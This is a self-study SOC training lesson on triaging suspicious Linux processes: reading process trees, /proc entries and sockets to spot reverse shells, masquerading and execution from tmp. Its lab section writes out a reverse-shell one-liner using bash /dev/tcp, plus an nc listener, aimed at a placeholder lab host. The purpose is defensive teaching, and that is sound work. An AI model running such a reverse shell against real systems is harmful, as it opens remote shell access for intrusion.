# Lesson 21 — Suspicious Process Investigation

**Status:** ✅ ready for self-study (full depth) · **Date written:** 2026-06-20
**Schema:** 12-section SOC (`docs/learning/CLAUDE_TEACHING_RULES.md`)
**Focus:** live process triage with `ps`/`/proc`/`lsof` — parent-child trees, reverse shells,
masquerading, exec-from-tmp, and tying a process to its network + files (T1059/T1055).
**Primary artifact:** `scripts/proc_investigate.sh`.

> **How to use this lesson:** read §1–§7, do §8 (run a benign "malicious" process + investigate it),
> produce §9, quiz, reflect. Then Lesson 22.

---

## §1 — Concept (Scientific Theory)

### What it is
When an alert (or hunt) points at a host, **process investigation** answers: *what is running, who
started it, what is it doing?* You read the **process tree** (parent→child), the process's **open
files + sockets** (`lsof`/`/proc/<pid>`), its **binary** (path + hash), and its **command line** —
to decide benign vs malicious. This is the core endpoint-investigation skill (the "what ran" half of
an intrusion).

### Why it exists
Execution (T1059) is where an intrusion becomes *action* — a reverse shell, a miner, a webshell's
child. The process is the live evidence; reading it fast separates an analyst from someone who only
reads alerts. Much of the capstone (Lesson 35) is process investigation.

### Three-Level Depth (Lens A)
- **Level 1 — Beginner:** list running programs, see which started which, and check anything weird
  (running from `/tmp`, talking to the internet, odd name).
- **Level 2 — Analyst/SOC:** `ps auxf` shows the tree; suspicious = wrong **parent** (a shell whose
  parent is `nginx`/`apache`), exec from **`/tmp`/`/dev/shm`**, a process with an **outbound socket**
  (`ss`/`lsof`), **masquerading** (named `kworker`/`sshd` but in the wrong path/cmdline), or
  **deleted binary still running** (`/proc/<pid>/exe (deleted)`).
- **Level 3 — Adversary/Kernel:** `/proc/<pid>/` exposes the truth: `exe` (real binary, even if
  unlinked), `cwd`, `cmdline`, `environ`, `fd/` (open files + sockets), `maps`. A reverse shell is a
  shell whose `fd 0/1/2` point at a socket. Process injection (T1055) hides code in another
  process's memory (`maps`/`mem`). The parent PID + start time tie it to the intrusion timeline.

### Two Teaching Approaches (Lens B) — the process tree
**Approach 1 (technical):** processes form a tree rooted at PID 1; legitimacy is contextual — a
process is suspicious by its *lineage* (unexpected parent), *origin* (binary path), *behavior* (its
fds/sockets), and *identity* (cmdline vs name). Investigate by walking the tree + reading `/proc`.

**Approach 2 (analogy):** an **org chart**. Everyone should have a sensible boss (parent). A janitor
(`bash`) reporting directly to the web-server department head (`nginx`) is wrong — janitors don't
report to web servers. You also check their badge (binary path) and what's on their desk (open
files/sockets). **Where it breaks down:** attackers forge the org chart (masquerading, re-parenting) —
so you verify identity (hash/path), not just the chart.

### Visual (ASCII) — a reverse shell in the tree
```
 systemd(1)─┬─nginx(800)───nginx(801)───bash(9001)───nc(9002)
            │                              │           └─ fd 0,1,2 → socket → 203.0.113.50:443  ✗
            │                              └─ /proc/9001/exe → /bin/bash  (parent=nginx = WRONG)
   legit:   systemd(1)───sshd(700)───sshd(720)───bash(750)  (admin shell, sensible lineage)  ✓
```

---

## §2 — Linux Investigation Commands

```bash
ps auxf                                   # full process TREE (lineage at a glance)
ps -eo pid,ppid,user,stime,etime,comm,args   # detail incl. parent + start time
ss -tunap | grep <pid> ; lsof -p <pid>     # the process's sockets + open files
ls -l /proc/<pid>/exe /proc/<pid>/cwd      # real binary path (shows "(deleted)" if unlinked)
cat /proc/<pid>/cmdline | tr '\0' ' '      # the true command line
sha256sum /proc/<pid>/exe                   # hash the running binary (IOC / lookup)
find / -newermt '-1 hour' -type f -path '*/tmp/*' 2>/dev/null   # recently dropped in tmp
bash scripts/proc_investigate.sh           # automated suspicious-process sweep
```
| Linux | Wazuh / SIEM |
|---|---|
| `ps auxf` lineage | Wazuh process inventory / rootcheck |
| `/proc/<pid>/exe` hash | hash reputation / FIM |
| socket per pid | network event correlated to process |

---

## §3 — Real-World Threat Context & Use Cases

- **Confirm a reverse shell:** alert says odd outbound → find the owning process + its socket fds.
- **Webshell child:** a shell parented by the web server = webshell execution (ties to Lesson 23).
- **Cryptominer / unknown binary:** high CPU + exec from `/tmp` + outbound to a pool.
- **Masquerading:** a process named like a kernel thread but with a real binary/path/cmdline.
- **Exam framing:** process analysis, T1059/T1055, and Linux forensics on CySA+/BTL1.

---

## §4 — Detection

- **Lineage rules:** alert on a shell/interpreter whose parent is a web/DB service (Wazuh +
  `auditd` execve, Lesson 04). High-signal.
- **Exec-from-tmp:** alert on `execve` of binaries in `/tmp`/`/dev/shm`.
- **Process+network correlation:** a new process with an outbound socket to a rare/bad IP.
- **Deleted-binary-running:** `/proc/<pid>/exe (deleted)` is a strong malware indicator.
- Most are behavioral/TTP detections (high on the Pyramid) — durable.

---

## §5 — Investigation & Triage

Given a suspect PID: walk the tree (parent/children), read `/proc/<pid>/{exe,cwd,cmdline,fd}`, map
its sockets + files, hash the binary (enrich), and tie its start time to the intrusion timeline.
Decide benign vs malicious from lineage + origin + behavior. **Preserve before killing** (copy the
binary, snapshot `/proc`, hash) — killing it destroys volatile evidence.

---

## §6 — SOC Perspective

Process investigation is the T2 deep-dive after a host alert. The SOC wires the high-signal lineage/
tmp-exec detections (Lesson 04 audit + Wazuh) so these surface automatically. `proc_investigate.sh`
is the standard "give me the suspicious processes on this host" tool. Maps to `soc/soc-scenarios.md`
#3.

---

## §7 — Incident-Response Perspective

In IR Phase 2, the process *is* the live evidence — snapshot it (ps/ss/lsof/`/proc` + binary hash)
before containment (Phase 3 = kill the process / isolate the host). The process's parent + start time
anchor the timeline; its socket gives the C2 IOC; its binary hash is a file IOC to sweep (Lesson 12).
Capstone stage 3.

---

## §8 — Practical Lab (build this yourself)

**Goal:** run a benign "malicious" process and investigate it like a real reverse shell.

### Lens C — Manual → Automated → Why
- **Manual:** read `ps auxf` and `/proc` by hand.
- **Automated:** `proc_investigate.sh` flags processes with bad lineage, tmp origin, outbound
  sockets, or deleted binaries — one command to surface suspects.
- **Why:** under pressure you want suspects ranked instantly; production EDR does this continuously
  with behavioral analytics.

### Steps
1. **Generate (drill 4, lab, benign):** start a fake reverse shell — `nc -lvnp 4444 &` then connect,
   or `bash -i >& /dev/tcp/<lab-host>/4444 0>&1` to your own listener. (Benign, self-owned.)
2. Investigate: `ps auxf` (find the shell + its parent), `ss -tunap | grep <pid>` / `lsof -p <pid>`
   (the socket), `/proc/<pid>/{exe,cmdline,fd}` (the truth), hash the binary.
3. Build `scripts/proc_investigate.sh`: list processes with outbound sockets, exec-from-tmp, or
   parent in a web/DB set; print PID/PPID/user/binary/socket. `bash -n` + `shellcheck` clean.
4. **Preserve then contain:** copy the binary + snapshot `/proc`/`ss` *before* `kill`ing it —
   practice evidence-first.
5. Note the audit/Wazuh detection that would have alerted (execve lineage / tmp-exec).

### Lens D — the raw artifact
```
$ ls -l /proc/9001/fd
0 -> socket:[123456]   1 -> socket:[123456]   2 -> socket:[123456]   # stdin/out/err = a SOCKET
$ cat /proc/9001/cmdline | tr '\0' ' ' ; echo
bash -i
# stdio wired to a socket + interactive bash = a reverse shell, unmistakably.
```

---

## §9 — GitHub Artifact (the 6-artifact evidence package)

1. **Script:** `scripts/proc_investigate.sh` (committed, `shellcheck`-clean).
2. **Detection rule/config:** the execve-lineage / tmp-exec audit + Wazuh rule (`infra/`), tagged
   T1059.
3. **Runbook:** `docs/runbooks/runbook-suspicious-process.md` — investigate a suspect PID.
4. **Playbook:** `docs/playbooks/process-investigation-play.md` (tree→/proc→socket→hash→preserve→
   contain).
5. **Incident report + notes:** the reverse-shell drill (investigated + preserved + contained) +
   notes.
6. **SOC ticket:** `SOC-21` (Task: "process investigation + reverse-shell drill") → Closed.

---

## §10 — Portfolio Artifact

- **Resume bullet:** "Investigated suspicious Linux processes (`ps`/`/proc`/`lsof`), identifying a
  reverse shell by lineage + socketed stdio, preserving evidence before containment (T1059)."
- **Interview talking point:** "first commands when a host looks compromised" and "how do you spot a
  reverse shell" — answered with the `/proc/fd → socket` tell.
- **Serves:** SOC T2 / IR (Stage 3). Core capstone skill.

---

## §11 — Certification Crossover Notes

- **CySA+:** host analysis/forensics. **Security+:** IR (4.x). **SC-200:** endpoint investigation.
  **BTL1:** host forensics. Builds on NaviOps process/`systemd`. Detail:
  `alignment/CERTIFICATION-MAPPING.md`.

---

## §12 — Security Notes (Lens E — Attacker & Defender)

**🔴 Attacker:** reverse/bind shells (T1059), process masquerading + re-parenting to blend in,
process injection (T1055), running from `/tmp`/`/dev/shm`, deleting the binary while it runs
(anti-forensics), naming like kernel threads.

**🔵 Defender:** detect by lineage + origin + behavior (TTP, durable), hash running binaries, alert
on tmp-exec + service-spawned-shells, and snapshot `/proc` before killing. Verify identity (path/
hash), never trust the process *name*.

---

## Quiz (Interview-Style, Graded)

**Q1.** What makes a process suspicious — name four signals you'd check with `ps`/`/proc`.
> **Your answer:**

**Q2.** How do you confirm a process is a reverse shell from `/proc/<pid>`?
> **Your answer:**

**Q3.** Why hash `/proc/<pid>/exe`, and what does "(deleted)" on it tell you?
> **Your answer:**

**Q4.** **Scenario:** `ps auxf` shows `bash` whose parent is `nginx`, with an established connection
to an external IP. Walk your investigation + response, preserving evidence.
> **Your answer:**

**Q5.** Why must you preserve process evidence before killing the process, and what do you collect?
> **Your answer:**

*(Request the "Professional Answer" comparison under each before moving on.)*

---

## Reflection
*(After the quiz)* — What did you learn? · What confused you? · What would you do differently?

---

## Search Keywords For Further Understanding

**Core**
- `ps auxf process tree investigation`
- `detect reverse shell /proc fd socket`
- `linux process masquerading detection`
- `process exec from tmp detection`
- `mitre t1059 t1055`

**Tools**
- `lsof process sockets files`
- `wazuh rootcheck process anomaly`

**Going further**
- `user account investigation` (L22) · `web attack analysis` (L23) · `capstone` (L35)

**Red / Blue (Lens E):**
- 🔴 `command interpreter T1059`, `process injection T1055`, `masquerading T1036`, `tmp execution`
- 🔵 `lineage detection`, `tmp-exec audit rule`, `binary hashing`, `preserve /proc before kill`

---

## Lesson Status
- [ ] §8 lab completed (reverse shell run + investigated + preserved + contained)
- [ ] 6-artifact evidence package committed (§9)
- [ ] Quiz answered + professional-answer comparisons (graded)
- [ ] Reflection + Search Keywords reviewed

When complete, run the Update Protocol, then move to **Lesson 22 — User Account Investigation**.

---

*Lesson 21 written by Navi · 2026-06-20 · full-depth. Sources to cite at study time: man7
`proc(5)`/`ps(1)`/`lsof(8)`, MITRE T1059/T1055/T1036, GTFOBins.*
